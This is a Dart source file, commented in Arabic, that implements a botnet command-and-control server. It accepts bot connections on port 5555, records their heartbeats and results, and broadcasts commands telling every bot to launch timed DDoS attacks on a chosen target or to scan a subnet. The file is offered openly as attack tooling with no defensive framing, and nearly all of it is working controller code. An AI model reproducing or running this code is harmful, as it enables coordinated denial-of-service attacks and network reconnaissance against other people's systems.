import 'dart:io';
import 'dart:async';
import 'dart:convert';
import 'dart:math';

class BotnetEngine {
  static final BotnetEngine _instance = BotnetEngine._internal();
  factory BotnetEngine() => _instance;
  BotnetEngine._internal();
  
  final List<BotClient> _connectedBots = [];
  final List<Map<String, dynamic>> _attackHistory = [];
  ServerSocket? _c2Server;
  bool _isRunning = false;
  int _port = 5555;
  final Random _random = Random();
  
  // بدء خادم C2
  Future<void> startC2Server({int port = 5555}) async {
    _port = port;
    _c2Server = await ServerSocket.bind(InternetAddress.anyIPv4, port);
    _isRunning = true;
    print('🎮 Botnet C2 Server started on port $port');
    
    _c2Server!.listen((socket) {
      final bot = BotClient(socket);
      _connectedBots.add(bot);
      print('🤖 New bot connected: ${socket.remoteAddress.address}:${socket.remotePort}');
      
      socket.listen((data) {
        final message = utf8.decode(data);
        _handleCommand(message, bot);
      }, onDone: () {
        _connectedBots.remove(bot);
        print('🔌 Bot disconnected: ${socket.remoteAddress.address}');
      });
    });
  }
  
  // معالجة الأوامر من البوتات
  void _handleCommand(String message, BotClient bot) {
    try {
      final json = jsonDecode(message);
      switch(json['type']) {
        case 'heartbeat':
          bot.lastHeartbeat = DateTime.now();
          break;
        case 'scan_result':
          _attackHistory.add({
            'type': 'scan',
            'target': json['target'],
            'result': json['result'],
            'timestamp': DateTime.now(),
            'bot': bot.address,
          });
          break;
        case 'attack_result':
          _attackHistory.add({
            'type': 'attack',
            'target': json['target'],
            'success': json['success'],
            'timestamp': DateTime.now(),
            'bot': bot.address,
          });
          break;
      }
    } catch (_) {}
  }
  
  // إرسال أمر لجميع البوتات
  Future<void> broadcastCommand(String command, Map<String, dynamic> data) async {
    final message = jsonEncode({
      'command': command,
      'data': data,
      'timestamp': DateTime.now().toIso8601String(),
    });
    
    for (final bot in _connectedBots) {
      try {
        bot.socket.add(utf8.encode(message));
      } catch (_) {}
    }
  }
  
  // هجوم DDoS موزع
  Future<void> launchDistributedAttack(String target, String attackType, int duration) async {
    print('💀 Launching $attackType attack on $target for $duration seconds');
    
    final attackId = DateTime.now().millisecondsSinceEpoch.toString();
    
    await broadcastCommand('attack', {
      'target': target,
      'type': attackType,
      'duration': duration,
      'attack_id': attackId,
    });
    
    _attackHistory.add({
      'type': 'ddos_launched',
      'target': target,
      'attack_type': attackType,
      'duration': duration,
      'bots': _connectedBots.length,
      'timestamp': DateTime.now(),
    });
  }
  
  // مسح موزع
  Future<void> launchDistributedScan(String subnet) async {
    print('📡 Launching distributed scan on $subnet.0/24');
    
    await broadcastCommand('scan', {
      'subnet': subnet,
      'scan_id': DateTime.now().millisecondsSinceEpoch.toString(),
    });
  }
  
  // جلب إحصائيات البوت نت
  Map<String, dynamic> getBotnetStats() {
    return {
      'active_bots': _connectedBots.length,
      'total_attacks': _attackHistory.length,
      'server_port': _port,
      'is_running': _isRunning,
      'uptime': _isRunning ? (DateTime.now().difference(_c2ServerStartTime)).inSeconds : 0,
    };
  }
  
  DateTime _c2ServerStartTime = DateTime.now();
  
  // إيقاف الخادم
  Future<void> stopC2Server() async {
    await broadcastCommand('shutdown', {});
    await Future.delayed(const Duration(seconds: 2));
    for (final bot in _connectedBots) {
      bot.socket.close();
    }
    await _c2Server?.close();
    _isRunning = false;
    _connectedBots.clear();
    print('🛑 Botnet C2 Server stopped');
  }
  
  // قائمة البوتات المتصلة
  List<Map<String, dynamic>> getConnectedBots() {
    return _connectedBots.map((bot) => {
      'address': bot.address,
      'last_heartbeat': bot.lastHeartbeat?.toIso8601String(),
      'connected_since': bot.connectedSince.toIso8601String(),
    }).toList();
  }
  
  // سجل الهجمات
  List<Map<String, dynamic>> getAttackHistory() {
    return _attackHistory.reversed.toList();
  }
}

class BotClient {
  final Socket socket;
  final String address;
  final DateTime connectedSince;
  DateTime? lastHeartbeat;
  
  BotClient(this.socket) 
    : address = '${socket.remoteAddress.address}:${socket.remotePort}',
      connectedSince = DateTime.now();
}
